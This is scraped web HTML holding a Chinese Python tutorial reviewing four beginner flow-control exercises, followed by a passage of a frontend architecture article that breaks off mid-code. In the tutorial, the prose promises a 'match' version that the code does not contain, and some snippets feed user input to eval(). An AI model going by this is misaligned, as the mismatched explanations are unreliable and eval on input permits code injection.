            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1462819851084228/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    love_summer
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T15:52:41.000Z" title="Mon Jan 12 2026 15:52:41 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;color:#3c9dff}.markdown-body h1{font-size:30px;margin-bottom:5px;padding-bottom:8px;text-align:center}.markdown-body h2{font-size:24px;padding-bottom:6px}.markdown-body h2:before{content:"🍋"}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h3:before{content:"🍓"}.markdown-body h4{font-size:16px}.markdown-body h4:before{content:"🍑"}.markdown-body h5{font-size:15px}.markdown-body h5:before{content:"🍉"}.markdown-body h6{margin-top:5px}.markdown-body h6:before{content:"🍒"}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;margin:0 auto;max-width:100%;border-radius:4px;padding:1px;border:1px solid #d2e8ff}.markdown-body img:hover{box-shadow:0 1px 3px #5eaeff}.markdown-body hr{height:4px;margin:34px 0;background-size:4px 1px;background-image:linear-gradient(270deg,#5eaeff,#f3f9ff 25%,transparent 50%);border-style:none}.markdown-body code{word-break:break-word;border-radius:3px;overflow-x:auto;background-color:#d2e8ff;color:#3c9dff;font-size:.9em;padding:.1em .5em;margin:0 3px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;transition:all .3s}.markdown-body pre{overflow:auto;position:relative;line-height:1.75;border:1px solid #90c7ff;border-radius:4px}.markdown-body pre:hover{box-shadow:0 1px 10px #beddff}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#3c9dff;border-bottom:1px solid #90c7ff;transition:all .3s}.markdown-body a:hover{color:#007fff;border-bottom:2px solid #5eaeff}.markdown-body a[href]:not(:empty){padding-right:18px}.markdown-body a[href]:not(:empty):after{display:inline-block;width:16px;height:16px;margin-left:2px;content:"";background:url(data:image/svg+xml;base64,PHN2ZyBjbGFzcz0iaWNvbiIgdmlld0JveD0iMCAwIDEwMjQgMTAyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB3aWR0aD0iMTYiIGhlaWdodD0iMTYiPjxwYXRoIGQ9Ik0zODQgMTI4YTQ4IDQ4IDAgMDEyLjgxNiA5NS45MkwzODQgMjI0SDI1NmEzMiAzMiAwIDAwLTMxLjkyIDI5LjZMMjI0IDI1NnY1MTJhMzIgMzIgMCAwMDI5LjYgMzEuOTJsMi40LjA4aDUxMmEzMiAzMiAwIDAwMzEuOTItMjkuNmwuMDgtMi40VjY1NmE0OCA0OCAwIDAxOTUuOTItMi44MTZMODk2IDY1NnYxMTJhMTI4IDEyOCAwIDAxLTEyNCAxMjcuOTM2bC00IC4wNjRIMjU2YTEyOCAxMjggMCAwMS0xMjcuOTM2LTEyNGwtLjA2NC00VjI1NmExMjggMTI4IDAgMDExMjQtMTI3LjkzNmw0LS4wNjRoMTI4em0zODQgMGExMjggMTI4IDAgMDExMjcuOTM2IDEyNGwuMDY0IDR2MTYwYTQ4IDQ4IDAgMDEtOTUuOTIgMi44MTZMODAwIDQxNlYyOTEuODcybC0zODIuMDY0IDM4Mi4wOGE0OCA0OCAwIDAxLTcwLjAzMi02NS42bDIuMTYtMi4yODhMNzMyLjA5NiAyMjRINjA4YTQ4IDQ4IDAgMDEtMi44MTYtOTUuOTJMNjA4IDEyOGgxNjB6IiBmaWxsPSIjM2M5ZGZmIiBmaWxsLW9wYWNpdHk9Ii41NiIgZGF0YS1zcG0tYW5jaG9yLWlkPSJhMzEzeC5zZWFyY2hfaW5kZXguMC5pMC41Yzc1M2E4MTgwa2RKWCIgY2xhc3M9InNlbGVjdGVkIi8+PC9zdmc+);background-size:100%}.markdown-body table{margin:0 auto 10px;font-size:12px;width:auto;max-width:100%;overflow:auto;border-collapse:collapse;border:1px solid #3c9dff}.markdown-body thead{text-align:center}.markdown-body thead th{color:#fff;background-color:#5eaeff}.markdown-body tr{text-align:center}.markdown-body tbody tr:hover{background-color:#d2e8ff}.markdown-body tbody tr:hover code{background-color:#90c7ff}.markdown-body tr:nth-child(2n){background-color:#ecf5ff}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5eaeff}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{font-weight:900;padding:0 1px;font-size:17px}.markdown-body small{color:#cbcbcb;padding:0 1px;font-size:22px;zoom:.5}.markdown-body em{padding:0 1px}.markdown-body del{padding:0 1px;text-decoration-thickness:2px}.markdown-body blockquote{color:#1a1b1c;padding:1px 20px;margin:22px 0;border-radius:4px;border-left:4px solid rgba(60,157,255,.5);background-color:rgba(190,221,255,.3)}.markdown-body blockquote blockquote{margin:8px 0}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body details{margin:12px 0;padding:4px 10px;border:2px solid #3c9dff;border-radius:8px;background-color:#ecf5ff;transition:all .3s}.markdown-body details summary{cursor:pointer}.markdown-body input[type=checkbox]{position:relative;appearance:none;width:16px;height:16px;border-radius:2px;vertical-align:middle;transform:translateY(-2px);box-sizing:border-box;border:1px solid #beddff}.markdown-body input[type=checkbox]:checked{border:1px solid #5eaeff;background-color:#5eaeff}.markdown-body input[type=checkbox]:checked:before{position:absolute;top:3px;left:1px;width:11px;height:6px;background-color:transparent;border-left:2px solid #fff;border-bottom:2px solid #fff;transform:rotate(-45deg);content:"";box-sizing:border-box}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="androidstudio">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#a9b7c6;background:#282b2e}.hljs-bullet,.hljs-literal,.hljs-number,.hljs-symbol{color:#6897bb}.hljs-deletion,.hljs-keyword,.hljs-selector-tag{color:#cc7832}.hljs-link,.hljs-template-variable,.hljs-variable{color:#629755}.hljs-comment,.hljs-quote{color:grey}.hljs-meta{color:#bbb529}.hljs-addition,.hljs-attribute,.hljs-string{color:#6a8759}.hljs-section,.hljs-title,.hljs-type{color:#ffc66d}.hljs-name,.hljs-selector-class,.hljs-selector-id{color:#e8bf6a}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p><strong>【前言】</strong></p>
<p>在Python的学习曲线中，掌握流程控制意味着你已经具备了编写复杂逻辑的能力。今天复盘第四章的4道实战题，重点分析其中的逻辑陷阱，并尝试使用Python 3.11的新特性<code>match</code>来优化代码结构。</p>
</blockquote>
<p><strong>【案例一：逻辑运算的优先级 —— 闰年判断】</strong></p>
<p><strong>问题复现</strong></p>
<p>闰年判断公式：<code>(year % 4 == 0 and year % 100 != 0) or (year % 400 == 0)</code>。</p>
<p><strong>代码分析</strong></p>
<p>这里不仅仅是<code>if</code>语句，更考察逻辑运算符的优先级。<code>and</code>的优先级高于<code>or</code>，所以虽然不加括号也能跑，但为了代码可读性，建议将并列条件用括号括起来。</p>
<p><strong>关键代码片段</strong></p>
<pre><code class="hljs language-python" lang="python">year=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'请输入一个四位的年份:'</span>))
<span class="hljs-keyword">if</span> (year%<span class="hljs-number">4</span>==<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> year%<span class="hljs-number">100</span>!=<span class="hljs-number">0</span>) <span class="hljs-keyword">or</span> year%<span class="hljs-number">400</span>==<span class="hljs-number">0</span>:
    <span class="hljs-built_in">print</span>(year,<span class="hljs-string">'年是闰年'</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(year,<span class="hljs-string">'年是平年'</span>)
</code></pre>
<p><strong>思考</strong>：能不能用更简洁的日历库<code>calendar</code>来实现一行代码判断？答案是可以的，但手动实现逻辑更能锻炼编程思维。</p>
<p><strong>【案例二：模式匹配的最佳实践 —— 模拟10086】</strong></p>
<p><strong>传统写法 vs Python 3.11 新写法</strong></p>
<p>传统的菜单查询通常使用冗长的<code>if...elif...else</code>。在Python 3.11中，我们可以使用结构模式匹配<code>match...case</code>，这让代码的可读性大幅提升，接近自然语言。</p>
<p><strong>代码实现（推荐使用match）</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment">#(1)初始化变量</span>
answer=<span class="hljs-string">'y'</span>
<span class="hljs-comment">#(2)条件判断</span>
<span class="hljs-keyword">while</span> answer==<span class="hljs-string">'y'</span>:
    <span class="hljs-comment">#(3)循环操作，语句块</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'---------------欢迎使用10086查询功能---------------------'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'1.查询当前余额'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'2.查询当前的剩余流量'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'3.查询当前的剩余通话时长'</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'0.退出系统'</span>)
    choice=<span class="hljs-built_in">input</span>(<span class="hljs-string">'请输入您要执行的操作:'</span>) <span class="hljs-comment"># input的结果是字符串类型</span>
    <span class="hljs-keyword">if</span> choice==<span class="hljs-string">'1'</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'当前余额为:234.5元'</span>)
    <span class="hljs-keyword">elif</span> choice==<span class="hljs-string">'2'</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'当前的剩余流量为:4GB'</span>)
    <span class="hljs-keyword">elif</span> choice==<span class="hljs-string">'3'</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'当前的剩余通话时间长为:300分钟'</span>)
    <span class="hljs-keyword">elif</span> choice==<span class="hljs-string">'0'</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'程序退出，谢谢您的使用'</span>)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'对不起，您输入的有误，请重新输入'</span>)
    <span class="hljs-comment"># (4)改变变量</span>
    answer=<span class="hljs-built_in">input</span>(<span class="hljs-string">'还继续操作吗？y/n'</span>)
<span class="hljs-keyword">else</span>: <span class="hljs-comment">#while...else</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'程序退出，谢谢您的使用'</span>)
</code></pre>
<p><strong>技术点</strong>：<code>match</code>不仅匹配简单的值，还可以解构复杂数据结构，这是Python向函数式语言靠拢的一大步。
<strong>【案例三：双重循环控制流 —— 九九乘法表】</strong></p>
<p><strong>难点突破</strong></p>
<p>很多新手在做这题时，会输出一个正方形的表，而不是三角形。核心在于内层循环的范围<code>range(1, i+1)</code>。</p>
<p><strong>技术细节</strong></p>
<ul>
<li><code>print</code>的<code>end</code>参数：默认是<code>\n</code>（换行），修改为<code>\t</code>（制表符）可以实现横向对齐。</li>
<li>外层循环<code>i</code>：控制行（1到9）。</li>
<li>内层循环<code>j</code>：控制列，每行的列数等于行号。</li>
</ul>
<p><strong>【案例四：二分查找思维的雏形 —— 猜数游戏】</strong></p>
<p><strong>算法思维</strong></p>
<p>虽然题目没要求限制猜测次数，但这是一个很好的引入“二分查找”思想的场景。如果每次猜中间数，效率最高。</p>
<p><strong>代码实现</strong></p>
<p>使用<code>random.randint(1, 100)</code>生成随机数，通过<code>while True</code>循环直到猜中为止。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> random
rand=random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>) <span class="hljs-comment"># 产生1-100之间的随机数</span>
count=<span class="hljs-number">1</span> <span class="hljs-comment"># 记录猜数的次数</span>
<span class="hljs-keyword">while</span> count&lt;=<span class="hljs-number">10</span>:
    number=<span class="hljs-built_in">eval</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">'在我心中有个数，1-100之间，请你猜一猜:'</span>))
    <span class="hljs-keyword">if</span> number==rand:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'猜对了'</span>)
        <span class="hljs-keyword">break</span>
    <span class="hljs-keyword">elif</span> number&gt;rand:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'大了'</span>)
    <span class="hljs-keyword">else</span>:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">'小了'</span>)
    count+=<span class="hljs-number">1</span> <span class="hljs-comment"># 每猜一次count次数要加1</span>
<span class="hljs-comment"># 判断次数</span>
<span class="hljs-keyword">if</span> count&lt;=<span class="hljs-number">3</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'真聪明，一共猜了'</span>,count,<span class="hljs-string">'次'</span>)
<span class="hljs-keyword">elif</span> count&lt;=<span class="hljs-number">6</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'还可以，一共猜了'</span>,count,<span class="hljs-string">'次'</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'猜的次数有点多啊，一共猜了'</span>,count,<span class="hljs-string">'次'</span>)
</code></pre>
<p><strong>扩展思考</strong>：如果要求在7次内必须猜中，代码该怎么写？（提示：记录次数并使用<code>break</code>）</p>
<blockquote>
<p><strong>【总结】</strong>
这4道题涵盖了选择结构、多重分支、嵌套循环和随机数生成。特别是<code>match</code>语法的应用，建议大家在日常开发中多尝试使用，写出更Pythonic的代码。</p>
</blockquote>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你的前端代码应该怎么写]]></title>    <link>https://juejin.cn/post/7594262760940175394</link>    <guid>https://juejin.cn/post/7594262760940175394</guid>    <pubDate>2026-01-12T12:48:53.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594262760940175394" data-draft-id="7594051966890278947" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你的前端代码应该怎么写"/> <meta itemprop="keywords" content="前端,JavaScript,架构"/> <meta itemprop="datePublished" content="2026-01-12T12:48:53.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="helloCat"/> <meta itemprop="url" content="https://juejin.cn/user/1908407918148728"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你的前端代码应该怎么写
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1908407918148728/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    helloCat
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-12T12:48:53.000Z" title="Mon Jan 12 2026 12:48:53 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读9分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">理解前端框架的本质</h2>
<p>前端在很大程度上能抽象成这两类功能。你的业务需求无非就是围绕着这两个点在打转。</p>
<ul>
<li>展示数据</li>
<li>处理表单</li>
</ul>
<p>而 Angular、React 和 Vue 这些视图框架的出现，则是可以让你用一种更加有效的方式来组织代码。接着， 自然而然的，。组件库可以让你更加高效地实现业务需求。理解了这些就会发现，做业务需求无非就是在做填空题。</p>
<p>让我们回顾历史，可以发现，前端（泛指各种客户端和浏览器端）框架的发展方向大致是这样。</p>
<ul>
<li>无框架：20世纪60年代，技术员们直接使用系统提供的API绘图，并逐渐形成一套开发GUI雏型系统。</li>
<li>MVC：Trygve Reenskaug 于 Xerox PARC 工作时，发现了这种模式。他把应用程序分成了三个部分：模型（Model）、视图（View）和控制器（Controller）。模型负责管理应用程序的数据和业务逻辑，视图负责展示数据给用户，控制器负责处理用户输入并更新模型和视图。主要贡献是提供了<strong>关注点分离</strong>，这极大的影响了后续软件开发的模式。MVC弊端在于，容易形成巨大且难以维护的 Controller 逻辑。</li>
<li>MVP：在 MVC 的基础上，IBM 的 Mike Potel 在1996年的一篇<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.wildcrest.com%2FPotel%2FPortfolio%2Fmvp.pdf" target="_blank" title="https://www.wildcrest.com/Potel/Portfolio/mvp.pdf" ref="nofollow noopener noreferrer">论文</a>中提出 MVP 概念，其核心是，<strong>把视图和模型完全分离</strong>，引入了 Presenter 层，你可以直接理解为 Presenter 对象持有了视图对象并主动更新视图，这解耦了视图层和模型层。</li>
<li>MVVM：2005年，微软的 John Gossman 发布 WPF（Windows Presentation Foundation）时，提出了 MVVM 架构模式。MVVM 是对 MVP 的改进，主要区别在于引入了 ViewModel 层来处理业务逻辑和用户交互。ViewModel层负责处理视图层的事件和更新模型层的数据，把视图层和模型层完全分离的同时，也不耦合具体的视图和模型。</li>
<li>Reactive MVVM：2010年，微软的 Reactive Extensions（Rx）库被引入，为 MVVM 架构引入了<strong>响应式编程</strong>和声明式视图的概念。这让 ViewModel 从框架中脱离出来，使得开发者能脱离具体的视图框架而独立开发，同时也使得 ViewModel 更加灵活和可测试，也能把这种思想引入到其他语言中，比如 RxJS， RxJava等。</li>
<li>Flux MVVM ：2014年，Facebook 发布了 Flux 架构模式，它是一种基于<strong>单向数据流</strong>的架构模式。Flux 架构模式强调将应用程序的状态存储在一个单一的数据源中，并且只能通过特定的方式来更新状态。</li>
</ul>
<p>从上面的发展路径可以看到，大家会倾向于寻找一种能够分离数据和视图的架构设计模式。而大家发现，从 MVC、MVP 再到 MVVM，与其主动操纵GUI框架的接口去同步数据层，倒不如把数据层的状态变成响应式的，让视图层通过一个中间层来获取对应的状态变更。让大家从繁琐的 GUI 操作中解放出来，专注于业务逻辑的实现。</p>
<p>从上面的历史发展来看，现代前端框架的本质就是一种<strong>响应式的视图框架</strong>。而基于这些框架编写的代码，你需要关注以下这么几个点，来保证你的代码质量。</p>
<h2 data-id="heading-1">关注数据流</h2>
<p>如果你有装修房子的水电的经验（或者没有经验也没问题），只要你思考过怎么装修，那么装修步骤就会是这样。</p>
<ul>
<li>在蓝图上设计好管道走向。</li>
<li>然后施工时，按照蓝图上的路线来进行管道安装工作。</li>
<li>最后，通电、通水，检查管道是否畅通。</li>
</ul>
<p>这其实跟软件开发很类似。因为在响应式编程中，也是有<strong>管道（pipeline）</strong> 这个概念的。你可以把数据看作是水，而管道就是用来控制水的流向。所以，在开发时，我们需要关心的是管道应该如何架设，这也是响应式编程的核心思路。</p>
<p>举个例子，假设我们需要实现一个简单的“输入搜索并显示结果”的功能。</p>
<p><strong>关注“操作”的写法（命令式）：</strong>
你需要在输入事件中手动调度所有相关的数据更新。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 外部数据源</span>
<span class="hljs-keyword">const</span> data = [<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'orange'</span>, <span class="hljs-string">'peach'</span>];

<span class="hljs-keyword">const</span> [searchTerm, setSearchTerm] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);
<span class="hljs-keyword">const</span> [filteredData, setFilteredData] = <span class="hljs-title function_">useState</span>([]);
<span class="hljs-keyword">const</span> [hasNoResults, setHasNoResults] = <span class="hljs-title function_">useState</span>(<span class="hljs-literal">true</span>);

<span class="hljs-keyword">function</span> <span class="hljs-title function_">onSearch</span>(<span class="hljs-params">text: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-comment">// 1. 手动更新搜索词</span>
  <span class="hljs-title function_">setSearchTerm</span>(text);
  
  <span class="hljs-comment">// 2. 手动计算搜索结果</span>
  <span class="hljs-keyword">const</span> results = data.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-title function_">includes</span>(text));
  <span class="hljs-comment">// 如果这里漏了，UI 就不会更新</span>
  <span class="hljs-title function_">setFilteredData</span>(results); 
  
  <span class="hljs-comment">// 3. 手动计算是否为空</span>
  <span class="hljs-title function_">setHasNoResults</span>(results.<span class="hljs-property">length</span> === <span class="hljs-number">0</span>);
}
</code></pre>
<p><strong>关注“数据流”的写法（声明式/响应式）：</strong>
你只需要定义数据之间的<strong>依赖关系（管道）</strong>，数据会自动流转。</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// 外部数据源</span>
<span class="hljs-keyword">const</span> data = [<span class="hljs-string">'apple'</span>, <span class="hljs-string">'banana'</span>, <span class="hljs-string">'orange'</span>, <span class="hljs-string">'peach'</span>];

<span class="hljs-comment">// 1. 水源 (Source)</span>
<span class="hljs-keyword">const</span> [searchTerm, setSearchTerm] = <span class="hljs-title function_">useState</span>(<span class="hljs-string">''</span>);

<span class="hljs-comment">// 2. 管道 (Pipeline) - 只要源头变了，结果自然会变</span>
<span class="hljs-keyword">const</span> filteredData = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">return</span> data.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-title function_">includes</span>(searchTerm));
}, [searchTerm, data]);

<span class="hljs-comment">// 3. 管道 (Pipeline) - 基于上游数据的进一步衍生</span>
<span class="hljs-keyword">const</span> hasNoResults = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> {
